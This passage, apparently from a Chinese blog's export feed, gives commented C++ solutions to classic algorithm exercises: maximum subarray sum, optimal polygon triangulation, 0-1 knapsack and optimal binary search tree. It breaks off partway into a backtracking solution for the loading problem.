    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>


<h1 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/subsum.png"></p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dividedMaxSubSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">==</span> right<span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 单个元素最大子段和为该元素的值</span>
	<span class="token keyword">int</span> mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> lSum <span class="token operator">=</span> <span class="token function">dividedMaxSubSum</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 划分左端子数组的最大子段和</span>
	<span class="token keyword">int</span> rSum <span class="token operator">=</span> <span class="token function">dividedMaxSubSum</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 划分右端子数组的最大子段和</span>
	<span class="token comment">// 计算穿过划分点的子数组左端的最大子段和</span>
	<span class="token keyword">int</span> midL <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> maxMidL <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> mid<span class="token punctuation">;</span> i <span class="token operator">>=</span> left<span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		midL <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		maxMidL <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxMidL<span class="token punctuation">,</span> midL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// 计算穿过划分点的子数组右端的最大子段和</span>
	<span class="token keyword">int</span> midR <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> maxMidR <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		midR <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		maxMidR <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxMidR<span class="token punctuation">,</span> midR<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// 子数组的最大子段和为三者之间最大的一个</span>
	<span class="token keyword">return</span> <span class="token function">max</span><span class="token punctuation">(</span>maxMidL <span class="token operator">+</span> maxMidR<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>lSum<span class="token punctuation">,</span> rSum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">maxSubSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dividedMaxSubSum</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">maxSubSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			sum <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token comment">// 当前累计总和小于零，则包含该部分的子段必不可能为最大子段，可根据反证法证明：</span>
		<span class="token comment">// 假设子段S为最大子段，且其包含总和为负的前缀子段s1，则将该前缀子段删去后得到的新子段S'的子段和必定大于S，与假设矛盾</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			sum <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="凸多边形最优三角剖分"><a href="#凸多边形最优三角剖分" class="headerlink" title="凸多边形最优三角剖分"></a>凸多边形最优三角剖分</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/poly1.png"></p>
<p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/poly2.png"></p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">minScoreTriangulation</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> values<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 多边形顶点序列长度len</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 顶点序列左端点i</span>
            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 顶点序列右端点j</span>
            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 划分点k</span>
                <span class="token keyword">int</span> cost <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> values<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> values<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">*</span> values<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> cost<span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>


<h1 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0-1背包问题"></a>0-1背包问题</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/knapsack.png"></p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">knapsack01</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> weights<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> values<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> weights<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// dp[i][j]表示可选商品为0～i，背包容量为j情况下的最优解</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> weights<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> c<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 若i=0，即可选商品只有0，此时最优解为：能否装下商品0 ? values[0] : 0</span>
		dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> values<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 可选商品0～i</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> c<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 背包容量j</span>
			dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 不选择商品i</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 若j >= weight[i]，则可选择商品i</span>
				<span class="token comment">// 取两种情况（选择或不选择商品i）下的最优解</span>
				dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> dp<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="最优二叉搜索树"><a href="#最优二叉搜索树" class="headerlink" title="最优二叉搜索树"></a>最优二叉搜索树</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/bst.png"></p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// pNonLeaves[i](i >= 1)表示非叶结点i的搜索概率，pLeaves[i](i >= 0)表示叶子结点i的搜索概率</span>
<span class="token comment">// 如输入为 pNonLeaves = &#123; 0.0,0.15,0.10,0.05,0.10,0.20 &#125;</span>
<span class="token comment">// 表示非叶结点i的搜索概率p[1～5] = [ 0.15,0.10,0.05,0.10,0.20 ]（原数组首个0为占位用，无实际含义）</span>
<span class="token comment">// 如输入为 pLeaves = &#123; 0.05,0.10,0.05,0.05,0.05,0.10 &#125;</span>
<span class="token comment">// 表示非叶结点i的搜索概率q[0～5] = [ 0.05,0.10,0.05,0.05,0.05,0.10 ]</span>
<span class="token keyword">double</span> <span class="token function">optimalBST</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">&amp;</span> pNonLeaves<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">&amp;</span> pLeaves<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> pNonLeaves<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 非叶节点的个数n</span>
    <span class="token comment">// dp[i][j]表示根据结点序列pNonLeaves[i～j]和pLeaves[i～j]构成的最优解（子树）</span>
    <span class="token comment">// dp[i][i-1]代表只含有叶结点i-1的子树（不含非叶节点）</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> DBL_MAX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// root[i][j]表示dp[i][j]对应的子树的根节点，可根据其构造最优二叉搜索树</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">root</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// pSum[i][j]表示结点序列pNonLeaves[i～j]和pLeaves[i～j]的概率总和</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">>></span> <span class="token function">pSum</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 初始化dp和pSum</span>
        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> pLeaves<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        pSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> pLeaves<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 结点序列长度len</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 序列左端点i</span>
            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 序列右端点j</span>
            pSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> pSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> pNonLeaves<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> pLeaves<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 递推计算结点序列区间概率和</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> r <span class="token operator">=</span> i<span class="token punctuation">;</span> r <span class="token operator">&lt;=</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将非叶结点r选作根节点</span>
                <span class="token keyword">double</span> cost <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> pSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 该情况下的搜索代价</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>cost <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>
                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">;</span>
                    root<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</code></pre>]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法分析与设计编程题 回溯法</title>
    <url>/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/</url>
    <content><![CDATA[<h1 id="装载问题"><a href="#装载问题" class="headerlink" title="装载问题"></a>装载问题</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/load.png"></p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="递归回溯"><a href="#递归回溯" class="headerlink" title="递归回溯"></a>递归回溯</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// goods[i]表示货物i的重量, c1,c2分别表示货船1和货船2的载重量</span>
vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 货物数量</span>
	<span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 当前最大载货量</span>
	<span class="token comment">// curSelection[i]表示货物i是否放入货船1中（true表示放入）</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// optimSelection记录maxSum对应的货物存放方式</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span>

	<span class="token comment">// 递归搜索函数</span>
	function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 搜索达到最大深度，得到一个解</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>
